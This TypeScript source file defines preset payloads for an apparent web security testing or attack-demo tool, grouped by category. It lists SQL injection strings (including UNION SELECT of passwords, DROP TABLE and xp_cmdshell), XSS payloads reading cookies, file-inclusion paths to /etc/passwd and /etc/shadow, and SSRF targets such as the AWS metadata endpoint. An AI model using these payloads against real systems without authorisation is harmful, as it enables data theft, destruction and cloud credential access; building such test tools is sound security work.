export interface PresetPayload {
  label: string
  payload: string
  target: 'search' | 'login' | 'file' | 'proxy' | 'comment'
  method: 'GET' | 'POST'
}

export const PRESET_PAYLOADS: Record<string, PresetPayload[]> = {
  sqli: [
    { label: "Classic OR", payload: "' OR '1'='1", target: 'search', method: 'GET' },
    { label: "UNION SELECT", payload: "' UNION SELECT username, password FROM users--", target: 'search', method: 'GET' },
    { label: "DROP TABLE", payload: "'; DROP TABLE users--", target: 'login', method: 'POST' },
    { label: "Time-based Blind", payload: "1' AND SLEEP(5)--", target: 'login', method: 'POST' },
    { label: "Stacked Query", payload: "1; EXEC xp_cmdshell('dir')", target: 'search', method: 'GET' },
  ],
  xss: [
    { label: "Script Tag", payload: "<script>alert(1)</script>", target: 'comment', method: 'POST' },
    { label: "Img Onerror", payload: '<img src=x onerror=alert(document.cookie)>', target: 'comment', method: 'POST' },
    { label: "SVG Onload", payload: '<svg onload=alert(1)>', target: 'comment', method: 'POST' },
    { label: "javascript: URI", payload: 'javascript:alert(document.domain)', target: 'search', method: 'GET' },
    { label: "Event Handler", payload: '" onfocus="alert(1)" autofocus="', target: 'comment', method: 'POST' },
  ],
  lfi: [
    { label: "/etc/passwd", payload: "../../etc/passwd", target: 'file', method: 'GET' },
    { label: "/proc/self/environ", payload: "/proc/self/environ", target: 'file', method: 'GET' },
    { label: "Windows hosts", payload: "..\\..\\windows\\system32\\drivers\\etc\\hosts", target: 'file', method: 'GET' },
    { label: "Deep traversal", payload: "....//....//....//etc/shadow", target: 'file', method: 'GET' },
  ],
  'path-traversal': [
    { label: "Basic ../", payload: "../../../", target: 'file', method: 'GET' },
    { label: "URL Encoded", payload: "..%2f..%2f..%2f", target: 'file', method: 'GET' },
    { label: "Double Encoded", payload: "..%252f..%252f", target: 'file', method: 'GET' },
    { label: "Backslash", payload: "..\\..\\..\\", target: 'file', method: 'GET' },
  ],
  ssrf: [
    { label: "AWS Metadata", payload: "http://169.254.169.254/latest/meta-data/", target: 'proxy', method: 'POST' },
    { label: "Localhost", payload: "http://127.0.0.1:22", target: 'proxy', method: 'POST' },
    { label: "Internal IP", payload: "http://10.0.0.1/admin", target: 'proxy', method: 'POST' },
    { label: "IPv6 Loopback", payload: "http://[::1]/", target: 'proxy', method: 'POST' },
  ],
}

export const CATEGORY_LABELS: Record<string, string> = {
  sqli: 'SQL Injection',
  xss: 'Cross-Site Scripting',
  lfi: 'Local File Inclusion',
  'path-traversal': 'Path Traversal',
  ssrf: 'Server-Side Request Forgery',
}

export const CATEGORY_COLORS: Record<string, string> = {
  sqli: '#ff3366',
  xss: '#ff00ff',
  lfi: '#00d4ff',
  'path-traversal': '#9966ff',
  ssrf: '#ffaa00',
}
